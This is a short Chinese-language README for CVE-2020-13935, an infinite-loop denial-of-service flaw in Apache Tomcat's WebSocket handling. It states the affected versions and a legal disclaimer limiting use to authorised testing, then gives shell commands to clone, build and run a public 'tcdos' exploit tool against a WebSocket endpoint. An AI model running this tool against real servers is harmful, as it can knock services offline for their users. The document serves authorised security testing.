### 声明

此处提供的漏洞检测方法、文件等内容，均仅限于安全从业者在获得法律授权的情况下使用，目的是检测已授权的服务器的安全性。安全从业者务必遵守法律规定，禁止在没有得到授权的情况下做任何漏洞检测。

### 漏洞信息

* 漏洞名称: WebSocket Dos Vulnerability in Apache Tomcat (CVE-2020-13935)
* 漏洞描述: WebSocket frame中的"负载长度"(payload length)没有被正确地验证. "无效的负载长度"(Invalid payload lengths)能触发一个"无限循环"(infinite loop). 具有"无效的负载长度"的多个requests能够导致拒绝服务.
* 漏洞分析: [Exploit - Apache Tomcat (CVE-2020-13935)](https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/)
* 检测前提: tomcat版本在受影响范围内, 且用到了websocket.

```
Affects:
9.0.0.M1 to 9.0.36
```

#### Usage

```shell
$ git clone https://github.com/RedTeamPentesting/CVE-2020-13935
$ cd CVE-2020-13935
$ go build
$ ./tcdos [WebSocket endpoint]

# 例1
# 安装 Apache Tomcat 之后, 会有自带的examples 如http://localhost:8080/examples/websocket/echo.xhtml 这里就用到了websocket.
$ ./tcdos ws://localhost:8080/examples/websocket/echoProgrammatic
```
